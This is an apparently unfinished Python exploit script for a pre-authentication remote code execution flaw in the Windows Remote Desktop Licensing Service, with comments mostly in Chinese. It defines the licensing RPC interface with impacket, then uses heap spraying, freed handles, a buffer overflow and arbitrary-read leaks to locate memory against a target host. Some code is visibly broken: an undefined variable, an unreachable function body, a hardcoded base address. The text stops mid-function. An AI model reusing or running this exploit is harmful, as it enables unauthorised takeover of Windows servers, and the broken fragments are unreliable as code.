import struct, hashlib, argparse
from time import sleep
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.ndr import NDRUniConformantArray, NDRPOINTER, NDRSTRUCT, NDRCALL, NDR
from impacket.dcerpc.v5.dtypes import BOOL, ULONG, DWORD, PULONG, PWCHAR, PBYTE, WIDESTR, UCHAR, WORD, LPSTR, PUINT, WCHAR
from impacket.uuid import uuidtup_to_bin
from Cryptodome.Util.number import bytes_to_long
from wincrypto import CryptEncrypt, CryptImportKey
import pdb
import sys

UUID = uuidtup_to_bin(("3d267954-eeb7-11d1-b94e-00c04fa3080d", "1.0"))
TRY_TIMES = 3
SLEEP_TIME = 5
SLEEP_TIME_LONG = 7
DESCRIPTION = "MadLicense: Windows Remote Desktop Licensing Service Preauth RCE"
dce = None
rpctransport = None
ctx_handle = None
handle_lists = []
leak_idx = 0
heap_base = 0
ntdll_base = 0
peb_base = 0
pe_base = 0
rpcrt4_base = 0
kernelbase_base = 0
kernel32_base = 0
#NDRUniConformantArray = UCHAR
vs_alloc_addr = 0
g_heap_offset_predication = 0x09450000 #0x8450000 0x9450000 or 0xa450000?
g_handle_remove = 0x20 #must below than (0x800 - 0x400)/2 = 0x200 or (0xc00 - 0x400)/2 = 0x400

def p8(x):
    return struct.pack("B", x)

def p16(x):
    return struct.pack("H", x)
    
def p24(x):
    x = x & 0xFFFFFF
    return struct.pack("<I", x)[:3] 

def p32(x):
    return struct.pack("I", x)

def p64(x):
    return struct.pack("Q", x)

def p48(x):
    x = x & 0xFFFFFFFFFFFF
    return struct.pack("<Q", x)[:6]
        
    
class CONTEXT_HANDLE(NDRSTRUCT):
    structure = (
        ("Data", "20s=b"),
    )

    def getAlignment(self):
        return 4



def make_TLSDbWorkSpace(instance,addr1,addr2):
    payload = b''
    payload += p64(instance)
    stuff1 = b'0'*0x68   
    payload += stuff
    
    payload += p64(addr1)
    stuff1 = b'0'*0x178
    
    payload += p64(addr2)
    
    return payload

    

def make_ENUMHANDLE(ws_ptr,key_pack) :
    
    payload = b""
    payload += p64(ws_ptr)
    payload += p64(key_pack)
    stuff1 = b'1'*0x1474
    payload += stuff
    return payload


    



class TLSRpcGetVersion(NDRCALL):
    opnum = 0
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
        ("version", PULONG),
    )


class TLSRpcGetVersionResponse(NDRCALL):
    structure = (
        ("version", ULONG),
    )


class TLSRpcConnect(NDRCALL):
    opnum = 1


class TLSRpcConnectResponse(NDRCALL):
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
    )


class TLSBLOB(NDRSTRUCT):
    structure = (
        ("cbData", ULONG),
        ("pbData", PBYTE),
    )


class TLSCRYPT_ALGORITHM_IDENTIFIER(NDRSTRUCT):
    structure = (
        ("pszObjId", LPSTR),
        ("Parameters", TLSBLOB),
    )


class TLSCRYPT_BIT_BLOB(NDRSTRUCT):
    structure = (
        ("cbData", DWORD),
        ("pbData", PBYTE),
        ("cUnusedBits", DWORD),
    )


class TLSCERT_PUBLIC_KEY_INFO(NDRSTRUCT):
    structure = (
        ("Algorithm", TLSCRYPT_ALGORITHM_IDENTIFIER),
        ("PublicKey", TLSCRYPT_BIT_BLOB),
    )


class PTLSCERT_PUBLIC_KEY_INFO(NDRPOINTER):
    referent = (
        ("Data", TLSCERT_PUBLIC_KEY_INFO),
    )


class TLSCERT_EXTENSION(NDRSTRUCT):
    structure = (
        ("pszObjId", LPSTR),
        ("fCritical", BOOL),
        ("Value", TLSBLOB),
    )


class TLSCERT_EXTENSION_ARRAY(NDRUniConformantArray):
    item = TLSCERT_EXTENSION


class PTLSCERT_EXTENSION(NDRPOINTER):
    referent = (
        ("Data", TLSCERT_EXTENSION_ARRAY),
    )


class TLSHYDRACERTREQUEST(NDRSTRUCT):
    structure = (
        ("dwHydraVersion", DWORD),
        ("cbEncryptedHwid", DWORD),
        ("pbEncryptedHwid", PBYTE),
        ("szSubjectRdn", PWCHAR),
        ("pSubjectPublicKeyInfo", PTLSCERT_PUBLIC_KEY_INFO),
        ("dwNumCertExtension", DWORD),
        ("pCertExtensions", PTLSCERT_EXTENSION),
    )


class PTLSHYDRACERTREQUEST(NDRPOINTER):
    referent = (
        ("Data", TLSHYDRACERTREQUEST),
    )


class TLSRpcRequestTermServCert(NDRCALL):
    opnum = 34
    structure = (
        ("phContext", CONTEXT_HANDLE),
        ("pbRequest", TLSHYDRACERTREQUEST),
        ("cbChallengeData", DWORD),
        ("pdwErrCode", DWORD),
    )


class TLSRpcRequestTermServCertResponse(NDRCALL):
    structure = (
        ("cbChallengeData", ULONG),
        ("pbChallengeData", PBYTE),
        ("pdwErrCode", ULONG),
    )


class TLSRpcRetrieveTermServCert(NDRCALL):
    opnum = 35
    structure = (
        ("phContext", CONTEXT_HANDLE),
        ("cbResponseData", DWORD),
        ("pbResponseData", NDRUniConformantArray),
        ("cbCert", DWORD),
        ("pbCert", NDRUniConformantArray),
        ("pdwErrCode", DWORD),
    )


class TLSRpcRetrieveTermServCertResponse(NDRCALL):
    structure = (
        ("cbCert", PUINT),
        ("pbCert", NDRUniConformantArray),
        ("pdwErrCode", PUINT),
    )


class TLSRpcTelephoneRegisterLKP(NDRCALL):
    opnum = 49
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
        ("dwData", ULONG),
        ("pbData", NDRUniConformantArray),
        ("pdwErrCode", ULONG)
    )


class TLSRpcTelephoneRegisterLKPResponse(NDRCALL):
    structure = (
        ("pdwErrCode", ULONG)
    )


class TLSCHALLENGEDATA(NDRSTRUCT):
    structure = (
        ("dwVersion", ULONG),
        ("dwRandom", ULONG),
        ("cbChallengeData", ULONG),
        ("pbChallengeData", PBYTE),
        ("cbReservedData", ULONG),
        ("pbReservedData", PBYTE),
    )


class PTLSCHALLENGEDATA(NDRPOINTER):
    referent = (
        ("Data", TLSCHALLENGEDATA),
    )


class TLSCHALLENGERESPONSEDATA(NDRSTRUCT):
    structure = (
        ("dwVersion", ULONG),
        ("cbResponseData", ULONG),
        ("pbResponseData", PBYTE),
        ("cbReservedData", ULONG),
        ("pbReservedData", PBYTE),
    )


class PTLSCHALLENGERESPONSEDATA(NDRPOINTER):
    referent = (
        ("Data", TLSCHALLENGERESPONSEDATA),
    )


class TLSRpcChallengeServer(NDRCALL):
    opnum = 44
    structure = (
        ("phContext", CONTEXT_HANDLE),
        ("dwClientType", ULONG),
        ("pClientChallenge", TLSCHALLENGEDATA),
        ("pdwErrCode", ULONG),
    )


class TLSRpcChallengeServerResponse(NDRCALL):
    structure = (
        ("pServerResponse", PTLSCHALLENGERESPONSEDATA),
        ("pServerChallenge", PTLSCHALLENGEDATA),
        ("pdwErrCode", ULONG),
    )


class TLSRpcResponseServerChallenge(NDRCALL):
    opnum = 45
    structure = (
        ("phContext", CONTEXT_HANDLE),
        ("pClientResponse", TLSCHALLENGERESPONSEDATA),
        ("pdwErrCode", ULONG),
    )


class TLSRpcResponseServerChallengeResponse(NDRCALL):
    structure = (
        ("pdwErrCode", ULONG),
    )


class TLSRpcRegisterLicenseKeyPack(NDRCALL):
    opnum = 38
    structure = (
        ("lpContext", CONTEXT_HANDLE),
        ("arg_1", NDRUniConformantArray),
        ("arg_2", ULONG),
        ("arg_3", NDRUniConformantArray),
        ("arg_4", ULONG),
        ("lpKeyPackBlob", NDRUniConformantArray),
        ("arg_6", ULONG),
        ("pdwErrCode", ULONG),
    )
# class TLSRpcRegisterLicenseKeyPack(NDRCALL):
#     opnum = 38
#     structure = (
#         ("lpContext", CONTEXT_HANDLE),
#         ("arg_1_len", ULONG),
#         ("arg_1", PBYTE),
#         ("arg_3_len", ULONG),
#         ("arg_3", PBYTE),
#         ("arg_6", ULONG),
#         ("lpKeyPackBlob", PBYTE),
#         ("pdwErrCode", ULONG),
#     )


class TLSRpcRegisterLicenseKeyPackResponse(NDRCALL):
    structure = (
        ("pdwErrCode", ULONG),
    )


class WIDESTR_STRIPPED(WIDESTR):
    length = None

    def __getitem__(self, key):
        if key == 'Data':
            return self.fields[key].decode('utf-16le').rstrip('\x00')
        else:
            return NDR.__getitem__(self, key)

    def getDataLen(self, data, offset=0):
        if self.length is None:
            return super().getDataLen(data, offset)
        return self.length * 2


class WCHAR_ARRAY_256(WIDESTR_STRIPPED):
    length = 256


class LSKeyPack(NDRSTRUCT):
    structure = (
        ("dwVersion", DWORD),
        ("ucKeyPackType", UCHAR),
        ("szCompanyName", WCHAR_ARRAY_256),
        ("szKeyPackId", WCHAR_ARRAY_256),
        ("szProductName", WCHAR_ARRAY_256),
        ("szProductId", WCHAR_ARRAY_256),
        ("szProductDesc", WCHAR_ARRAY_256),
        ("wMajorVersion", WORD),
        ("wMinorVersion", WORD),
        ("dwPlatformType", DWORD),
        ("ucLicenseType", UCHAR),
        ("dwLanguageId", DWORD),
        ("ucChannelOfPurchase", UCHAR),
        ("szBeginSerialNumber", WCHAR_ARRAY_256),
        ("dwTotalLicenseInKeyPack", DWORD),
        ("dwProductFlags", DWORD),
        ("dwKeyPackId", DWORD),
        ("ucKeyPackStatus", UCHAR),
        ("dwActivateDate", DWORD),
        ("dwExpirationDate", DWORD),
        ("dwNumberOfLicenses", DWORD),
    )


class LPLSKeyPack(NDRPOINTER):
    referent = (
        ("Data", LSKeyPack),
    )


class TLSRpcKeyPackEnumNext(NDRCALL):
    opnum = 13
    structure = (
        ("phContext", CONTEXT_HANDLE),
        ("lpKeyPack", LPLSKeyPack),
        ("pdwErrCode", ULONG),
    )


class TLSRpcKeyPackEnumNextResponse(NDRCALL):
    structure = (
        ("pdwErrCode", ULONG),
    )


class TLSRpcDisconnect(NDRCALL):
    opnum = 2
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
    )


class TLSRpcDisconnectResponse(NDRCALL):
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
    )


class TLSRpcGetServerName(NDRCALL):
    opnum = 4
    structure = (
        ("ctx_handle", CONTEXT_HANDLE),
        ("serverName", WCHAR),
        ("nameLen", ULONG),
        ("errCode", ULONG),
    )


class TLSRpcGetServerNameResponse(NDRCALL):
    structure = (
        ("serverName", WCHAR),
        ("nameLen", ULONG),
        ("pdwErrCode", ULONG),
    )


# 反转编码后的字符串
def b24encode(data):
    charmap = b"BCDFGHJKMPQRTVWXY2346789"
    data = data[::-1]
    data = bytes_to_long(data)
    enc = b""
    while data != 0:
        tmp = data % len(charmap)
        data //= len(charmap)
        
        enc += b"\x00"
        enc += bytes([charmap[tmp]])
        
    return enc[::-1]

def b24encode_error(data):
    charmap = "BCDFGHJKMPQRTVWXY2346789"  # 改为普通字符串
    data = data[::-1]
    data = bytes_to_long(data)
    enc = ""  # 改为空字符串
    while data != 0:
        tmp = data % len(charmap)
        data //= len(charmap)
        enc += charmap[tmp]  # 直接拼接字符
    
    
    enc =enc[::-1]
    res = list(enc.encode('ascii'))
    
    return res

# 断开连接后的句柄
def disconnect(handle):
    global dce
    disconn = TLSRpcDisconnect()
    disconn["ctx_handle"] = handle
    disconn_res = dce.request(disconn)
    ret = disconn_res["ctx_handle"]
    return ret


# 从句柄列表中移除已经断开连接的句柄
def handles_free():
    global handle_lists, heap_base
    
    for i in range(g_handle_remove):
        handle = handle_lists[0x400 + i * 2]
        disconnect(handle)
        handle_lists.remove(handle)
        
    sleep(SLEEP_TIME_LONG)
        
    


def remove_handles():
    return 0
    
    global handle_lists
    
    for handle in handle_lists[::-1]:
        disconnect(handle)
        handle_lists.remove(handle)

def spray_handles(times):
    global dce, handle_lists
        
    handle_lists = []
    for _ in range(times):
        rpc_conn = TLSRpcConnect()
        res_rpc_conn = dce.request(rpc_conn)
        handle = res_rpc_conn["ctx_handle"]
        handle_lists.append(handle)


def spray_fake_obj(reg_lic_keypack, times=0x1):
    global dce
    for i in range(times):
        dce.request(reg_lic_keypack)


def construct_TLSRpcTelephoneRegisterLKP(payload):
    global ctx_handle
    tls_register_LKP = TLSRpcTelephoneRegisterLKP()
    tls_register_LKP["ctx_handle"] = ctx_handle
    tls_register_LKP["dwData"] = len(payload)
    
    tls_register_LKP["pbData"] = bytes(payload)
    tls_register_LKP["pdwErrCode"] = 0
    return tls_register_LKP

#TLSRpcRequestTermServCert:ContextType must be 0,then server set it to 5 
#TLSRpcGetServerName:ClientFlag be none zero,or ContextType is 6
#TLSRpcRetrieveTermServCert:ContextType must be 5,then server set it to 0
def construct_overflow_arbread_buf(addr, padding,size):
    payload = b"0"*64
    #payload = b""
    if(size == 24):
        payload += p24(addr)        #RpcName
    else:
        payload += p64(addr)        #RpcName
    if padding:
        payload += p32(0)       #ReferenceCount      8
        payload += p32(0)       #ClientFlag         12
        payload += p32(1)       #LastError          16    
        #payload += p32(0)      #ContextType        20
        #payload += p64(0)      #ContextHandle      24
        pass
    
    payload = b24encode(payload)
    
    ascstr = payload.decode('unicode_escape')
    print(f"construct_overflow_arbread_buf payload:{ascstr}")
    
    tls_register_LKP = construct_TLSRpcTelephoneRegisterLKP(payload)
    return tls_register_LKP



#TLSRpcKeyPackEnumNext: (ClientFlag&3) must be none zero;context type must be 1
def construct_overflow_fake_obj_buf(fake_obj_addr):
    payload = b"0"*64
    payload += p64(fake_obj_addr)       #RpcName
    payload += p32(0)                   #ReferenceCount     8
    payload += p32(0xffffffff)          #ClientFlag         12
    
    payload += p32(0)                   #LastError          16
    payload += p32(1)                   #ContextType        20
    
    payload += p64(fake_obj_addr)       #ContextHandle      24
    
    #payload += p8(1)
    
    payload = b24encode(payload)
    
    ascstr = payload.decode('unicode_escape')
    print(f"construct_overflow_fake_obj_buf payload:{ascstr}")
    
    tls_register_LKP = construct_TLSRpcTelephoneRegisterLKP(payload)
    return tls_register_LKP


def arb_read(addr, padding=False, passZero=False, leakHeapBaseOffset=0,size = 64):
    print("[+] 开始执行arb_read函数")
    global leak_idx, handle_lists, dce, ctx_handle,heap_base,ntdll_base
    if isinstance(addr, list):
        print(f"[+] 0x800, leakHeapBaseOffset={leakHeapBaseOffset:x}")
        spray_lfh_chunk(0x20, 0x800)
        print("[+] 成功发送注册许可证密钥包请求1")
    else:
        print(f"[+] 0x400, leakHeapBaseOffset={leakHeapBaseOffset:x}")
        print("[+] 成功发送注册许可证密钥包请求2")
        spray_lfh_chunk(0x20, 0x400)
    
    print("[+] 堆喷射处理...")
    spray_handles(0xc00)
    print("[+] 堆喷射处理成功")
    handles_free()
    print("[+] 处理释放")
    
    serverName = "a" * 0x10
    get_server_name = TLSRpcGetServerName()
    #print(get_server_name)
    get_server_name["serverName"] = serverName + "\x00"
    get_server_name["nameLen"] = len(serverName) + 1
    get_server_name["errCode"] = 0
    
    if isinstance(addr, list):
        print(f"[+] tls_register_LKP: List element")
        tls_register_LKP = construct_overflow_arbread_buf(addr[0], padding,size)
    else:
        print(f"[+] tls_register_LKP: Variable")
        tls_register_LKP = construct_overflow_arbread_buf(addr, padding,size)

    print(f"[+] tls_register_LKP:执行成功")
    #showstr = tls_register_LKP.encode("utf-8")
    #print(f"{showstr}")
    '''
    pbData = b"c" * 0x10
    tls_blob = TLSBLOB()
    tls_blob["cbData"] = len(pbData)
    tls_blob["cbData"] = pbData
    tls_cert_extension = TLSCERT_EXTENSION()
    tls_cert_extension["pszObjId"] = "d" * 0x10 + "\x00"
    tls_cert_extension["fCritical"] = False
    tls_cert_extension["Value"] = tls_blob
    '''
    pbData2 = bytes.fromhex(   "3048024100bf1be06ab5c535d8e30a3b3dc616ec084ff4f5b9cfb2a30695ccc6c58c37356c938d3c165d980b07882a35f22ac2e580624cc08a2a3391e5e1f608f94764b27d0203010001")
    tls_crypt_bit_blob = TLSCRYPT_BIT_BLOB()
    tls_crypt_bit_blob["cbData"] = len(pbData2)
    tls_crypt_bit_blob["pbData"] = pbData2
    tls_crypt_bit_blob["cUnusedBits"] = 0
    tls_blob2 = TLSBLOB()
    tls_blob2["cbData"] = 0
    tls_blob2["pbData"] = b""
    tls_crypto_algorithm_identifier = TLSCRYPT_ALGORITHM_IDENTIFIER()
    tls_crypto_algorithm_identifier["pszObjId"] = "1.2.840.113549.1.9.1\x00"
    tls_crypto_algorithm_identifier["Parameters"] = tls_blob2
    tls_cert_public_key_info = TLSCERT_PUBLIC_KEY_INFO()
    tls_cert_public_key_info["Algorithm"] = tls_crypto_algorithm_identifier
    tls_cert_public_key_info["PublicKey"] = tls_crypt_bit_blob
    encryptedHwid = b"e" * 0x20
    hydra_cert_request = TLSHYDRACERTREQUEST()
    hydra_cert_request["dwHydraVersion"] = 0
    hydra_cert_request["cbEncryptedHwid"] = len(encryptedHwid)
    hydra_cert_request["pbEncryptedHwid"] = encryptedHwid
    hydra_cert_request["szSubjectRdn"] = "bbb\x00"
    hydra_cert_request["pSubjectPublicKeyInfo"] = tls_cert_public_key_info
    dwNumCertExtension = 0
    hydra_cert_request["dwNumCertExtension"] = dwNumCertExtension
    pbResponseData = b"a" * 0x10
    pbCert = b"b" * 0x10
    
    count = 0
    
    while True:

        try:
            print(f"[+] 请求 tls_register_LKP ...")
            dce.request(tls_register_LKP)
        except Exception as e:
            frame = sys._getframe(0)  
            func_name = frame.f_code.co_name
            line_no = frame.f_lineno
            print(f"{func_name} line:{line_no} exception:{str(e)}!")
            pass
        retAddr = 0x0
        for handle in handle_lists[::-1]:
            if padding:
                get_server_name["ctx_handle"] = handle
                res_get_server_name = dce.request(get_server_name)
                err_code = res_get_server_name["pdwErrCode"]
                if (err_code == 0):
                    continue
                else:
                    print("arb_read TLSRpcGetServerName error!")    #maybe this is deliberate failure ?
                    pass
            else:
                pass
            rpc_term_serv_cert = TLSRpcRequestTermServCert()
            rpc_term_serv_cert["phContext"] = handle
            rpc_term_serv_cert["pbRequest"] = hydra_cert_request
            rpc_term_serv_cert["cbChallengeData"] = 0x100
            rpc_term_serv_cert["pdwErrCode"] = 0
            rpc_retrieve_serv_cert = TLSRpcRetrieveTermServCert()
            rpc_retrieve_serv_cert["phContext"] = handle
            rpc_retrieve_serv_cert["cbResponseData"] = len(pbResponseData)
            rpc_retrieve_serv_cert["pbResponseData"] = pbResponseData
            rpc_retrieve_serv_cert["cbCert"] = len(pbCert)
            rpc_retrieve_serv_cert["pbCert"] = pbCert
            rpc_retrieve_serv_cert["pdwErrCode"] = 0
            try:
                res_rpc_term_serv_cert = dce.request(rpc_term_serv_cert)
                res_rpc_retrieve_serv_cert = dce.request(rpc_retrieve_serv_cert)

                #disconnect(handle)         #delete this line ?

                data = res_rpc_retrieve_serv_cert["pbCert"]
                if b"n\x00c\x00a\x00c\x00n\x00" not in data:
                    #handle_lists.remove(handle) 
                    #print("TLSRpcRetrieveTermServCert valid information")
                    if leak_idx == 0:
                        for i in range(len(data) - 6): 
                            retAddr = data[i + 4:i + 6] + data[i + 2:i + 4] + data[i:i + 2]
                            retAddr = bytes_to_long(b''.join(retAddr)) - leakHeapBaseOffset
                            if (size == 24)and( (retAddr & 0xffffff) == 0)and(retAddr < 0x7ff000000000)and(retAddr>0x10000000000):
                                leak_idx = i
                                print("[+] Find leak_idx: 0x{:x}".format(leak_idx))
                                handle_lists.remove(handle) 
                                remove_handles()
                                return retAddr                            
                            else:
                                pass
                    else:
                        if passZero:
                            data = data[leak_idx:leak_idx + 4]
                            retAddr = data[2:4] + data[0:2]
                        else:
                            data = data[leak_idx:leak_idx + 6]
                            retAddr = data[4:6] + data[2:4] + data[0:2]
                        retAddr = bytes_to_long(b''.join(retAddr)) - leakHeapBaseOffset
                        if retAddr > 0:
                            handle_lists.remove(handle) 
                            remove_handles()
                            return retAddr
                        else:
                            pass
                else:
                    print("arb_read data format error!")
                    pass
            except Exception as e:
                frame = sys._getframe(0)  
                func_name = frame.f_code.co_name
                line_no = frame.f_lineno
                #print(f"{func_name} line:{line_no} exception e:{str(e)}!")
                pass
                
        count += 1
        
        if isinstance(addr, list):
            if count < len(addr):
                print(f"try next time:{count}")
                sleep(SLEEP_TIME)
                targetAddr = addr[count]
                tls_register_LKP = construct_overflow_arbread_buf(targetAddr, padding,size)
            elif (len(addr) == 1) and (count >= TRY_TIMES):
                print(f"try time:{count},but not found target address!")
                remove_handles()
                return 0
            
                print("G!what do you mean?")
                targetAddr = 0xdeaddeadbeefbeef
                tls_register_LKP = construct_overflow_arbread_buf(targetAddr, True,size)
            elif (len(addr) == 1) and (count < TRY_TIMES):
                print(f"try next time:{count}")
                sleep(SLEEP_TIME)
                pass
            else:
                print(f"try time:{count},but not found target address!")
                remove_handles()
                return 0
        else:     
            if count >= TRY_TIMES :
                remove_handles()
                print(f"try time:{count},but not found target address!")
                return 0
            else:
                print(f"try next time:{count}")
                






# 发送注册许可证密钥包请求
def spray_lfh_chunk(size, loopsize):
    payload = b"\x00" * size
    #print(len(payload))
    reg_lic_keypack = construct_TLSRpcRegisterLicenseKeyPack(b"\x00")

    for _ in range(loopsize):
        #print("request")
        dce.request(reg_lic_keypack)
        


def construct_TLSRpcRegisterLicenseKeyPack(payload):
    global ctx_handle
    my_cert_exc = bytes.fromhex(
        "308201363081e5a0030201020208019e2bfac0ae2c30300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a3011310f300d06035504031e06006200620062305c300d06092a864886f70d0101010500034b003048024100b122dfa634ad803cbf0c1133986e7e551a036a1dfd521cd613c4972cd6f096f2a3dd0b8f80b8a26909137225134ec9d98b3acffd79c665061368c217613aba050203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341003f4ceda402ad607b9d1a38095efe25211010feb1e5a30fe5af6705c2e53a19949eaf50875e2e77c71a9b4945d631360c9dbec1f17d7e096c318547f8167d840e")
    my_cert_sig = bytes.fromhex(
        "3082036406092a864886f70d010702a0820355308203510201013100300b06092a864886f70d010701a0820339308201363081e5a0030201020208019e2bfac0ab6d10300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a3011310f300d06035504031e06006200620062305c300d06092a864886f70d0101010500034b003048024100b122dfa634ad803cbf0c1133986e7e551a036a1dfd521cd613c4972cd6f096f2a3dd0b8f80b8a26909137225134ec9d98b3acffd79c665061368c217613aba050203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341009fd29b18115c7ef500a2ee543a4bb7528403ccb4e9fe7fe3ac2dcbf9ede68a1eca02f97c6a0f3c2384d85ab12418e523db90958978251e28d0e7903829e46723308201fb308201a9a0030201020208019e2bfac0ab6d10300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a300d310b300906035504031302610030820122300d06092a864886f70d01010105000382010f003082010a0282010100e05a714323273db5f17c731e7db3b07397cf08a6d614484ab715793af931376622e3b86820ddb26ea763636c55092c712296da18049fd7e61b4429b1a14a85ab4567639c2d2fbc6098893ed9c553fb14f9f488f6ffa38f9ee3aaf44888981bdec21e7d617e6c7fc019e8f896098eb76470d56c4666c015f784f172aa7b4999c6fdc48e6e2a4cdaf256d69fcdd14cc82d50eb5a4e48a810679f97a5f6a933dd12e63159a72c1b3ba8c7e59af0dabdcc40f2489df6335f74614b1d2b9016644a12bce70e7470977a6e5025e9251dc4300d6ef39860cad59b06a9b81a27491e83ea826a505c3c756df9529e538259c004a832a67783893486171d3a075db49026e90203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341004b949db70bb077d19adfc707c20420afb99ae1f0a3e857ab4e3f085fe2c84b539412f4235dce03a53a43ddaa76adf7cc32e36af7b8e4e31707f881241d6bf36b3100")
    TEST_RSA_PUBLIC_MSKEYBLOB = bytes.fromhex(
        "080200001066000020000000c61b815f961a35c688b5af232f81158c3a21f95ec897a6efa41d5b23bcf0387e")
    
    data = b"\x00" * 0x3c       # 60个长度 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                 
    data += p32(len(payload))   # 32个长度
    #print(p32(len(payload)) )
    data += payload             # b'\x01\x00\x00\x00'
    data += b"\x00" * 0x10
    #print(len(data))            # 81长度
    # print(f"data:{data}")
    rsa_pub_key = CryptImportKey(TEST_RSA_PUBLIC_MSKEYBLOB)
    encrypted_data = CryptEncrypt(rsa_pub_key, data)
    #print(f"encrypted_data:{encrypted_data}")
    key = TEST_RSA_PUBLIC_MSKEYBLOB

    data = encrypted_data

    payload = b""
    payload += p32(len(key))
    payload += key
    payload += p32(len(data))
    payload += data

    reg_lic_keypack = TLSRpcRegisterLicenseKeyPack()
    
    reg_lic_keypack["lpContext"] = ctx_handle
    
    print(f"ctx_handle:{ctx_handle},length:{len(ctx_handle)}");
    
    reg_lic_keypack["arg_1"] = my_cert_sig
    reg_lic_keypack["arg_2"] = len(my_cert_sig)
    reg_lic_keypack["arg_3"] = my_cert_exc
    reg_lic_keypack["arg_4"] = len(my_cert_exc)
    reg_lic_keypack["lpKeyPackBlob"] = payload
    reg_lic_keypack["arg_6"] = len(payload)
    reg_lic_keypack["pdwErrCode"] = 0

    print("my_cert_sig size:0x{:x},my_cert_exc size:0x{:x},lpKeyPackBlob size:0x{:x},reg_lic_keypack size:0x{:x}".format(len(my_cert_sig),len(my_cert_exc),len(payload),len(reg_lic_keypack)) )
    
    #print(f"[+] 成功")
    return reg_lic_keypack
    #return reg


def construct_TLSRpcKeyPackEnumNext(handle):
    pLSKeyPack = LSKeyPack()
    pLSKeyPack["dwVersion"] = 1
    pLSKeyPack["ucKeyPackType"] = 1
    pLSKeyPack["szCompanyName"] = "a" * 255 + "\x00"
    pLSKeyPack["szKeyPackId"] = "a" * 255 + "\x00"
    pLSKeyPack["szProductName"] = "a" * 255 + "\x00"
    pLSKeyPack["szProductId"] = "a" * 255 + "\x00"
    pLSKeyPack["szProductDesc"] = "a" * 255 + "\x00"
    pLSKeyPack["wMajorVersion"] = 1
    pLSKeyPack["wMinorVersion"] = 1
    pLSKeyPack["dwPlatformType"] = 1
    pLSKeyPack["ucLicenseType"] = 1
    pLSKeyPack["dwLanguageId"] = 1
    pLSKeyPack["ucChannelOfPurchase"] = 1
    pLSKeyPack["szBeginSerialNumber"] = "a" * 255 + "\x00"
    pLSKeyPack["dwTotalLicenseInKeyPack"] = 1
    pLSKeyPack["dwProductFlags"] = 1
    pLSKeyPack["dwKeyPackId"] = 1
    pLSKeyPack["ucKeyPackStatus"] = 1
    pLSKeyPack["dwActivateDate"] = 1
    pLSKeyPack["dwExpirationDate"] = 1
    pLSKeyPack["dwNumberOfLicenses"] = 1
    rpc_key_pack_enum_next = TLSRpcKeyPackEnumNext()
    rpc_key_pack_enum_next["phContext"] = handle
    rpc_key_pack_enum_next["lpKeyPack"] = pLSKeyPack
    rpc_key_pack_enum_next["pdwErrCode"] = 0
    return rpc_key_pack_enum_next





def connect_to_license_server(target_ip):
    print("[+] 连接到认证服务器")
    global dce, rpctransport, ctx_handle
    stringbinding = epm.hept_map(target_ip, UUID, protocol="ncacn_ip_tcp")
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_connect_timeout(100)
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_level(2)
    dce.connect()
    dce.bind(UUID)
    rpc_conn = TLSRpcConnect()
    res_rpc_conn = dce.request(rpc_conn)
    ctx_handle = res_rpc_conn["ctx_handle"]
    print(f"ctx_handle:{ctx_handle},length:{len(ctx_handle)}");
    get_version = TLSRpcGetVersion()
    get_version["ctx_handle"] = ctx_handle
    get_version["version"] = 3
    res_get_version = dce.request(get_version)
    version = res_get_version["version"]
    print("[+] Get Server version: 0x{:x}".format(version))
    CHAL_DATA = b"a" * 0x10
    RESV_DATA = b"b" * 0x10
    cli_chal = TLSCHALLENGEDATA()
    cli_chal["dwVersion"] = 0x10000
    cli_chal["dwRandom"] = 0x4
    cli_chal["cbChallengeData"] = len(CHAL_DATA) + 1
    cli_chal["pbChallengeData"] = CHAL_DATA + b"\x00"
    cli_chal["cbReservedData"] = len(RESV_DATA) + 1
    cli_chal["pbReservedData"] = RESV_DATA + b"\x00"
    chal_server = TLSRpcChallengeServer()
    chal_server["phContext"] = ctx_handle
    chal_server["dwClientType"] = 0
    chal_server["pClientChallenge"] = cli_chal
    chal_server["pdwErrCode"] = 0
    chal_response = dce.request(chal_server)
    g_pszServerGuid = "d63a773e-6799-11d2-96ae-00c04fa3080d".encode("utf-16")[2:]
    dwRandom = chal_response["pServerChallenge"]["dwRandom"]
    pbChallengeData = b"".join(chal_response["pServerChallenge"]["pbChallengeData"])
    pbResponseData = hashlib.md5(pbChallengeData[:dwRandom] + g_pszServerGuid + pbChallengeData[dwRandom:]).digest()
    pClientResponse = TLSCHALLENGERESPONSEDATA()
    pClientResponse["dwVersion"] = 0x10000
    pClientResponse["cbResponseData"] = len(pbResponseData)
    pClientResponse["pbResponseData"] = pbResponseData
    pClientResponse["cbReservedData"] = 0
    pClientResponse["pbReservedData"] = ""
    resp_ser_chal = TLSRpcResponseServerChallenge()
    resp_ser_chal["phContext"] = ctx_handle
    resp_ser_chal["pClientResponse"] = pClientResponse
    resp_ser_chal["pdwErrCode"] = 0
    res_resp_ser_chal = dce.request(resp_ser_chal)

def GetVsAllocAddr(blockSize):
    global ntdll_base,heap_base
    
    blockSize = (blockSize + 0xf)>>4
    blockSize = (blockSize + 1)<<16
    if ntdll_base == 0:
        ntdll_base = 0x00007ffaf5c00000
    if heap_base == 0:
        heap_offset_list = [0x100008, 0x100008, 0x400000, 0x600000, 0x800000, 0xb00000, 0xd00000, 0xf00000]
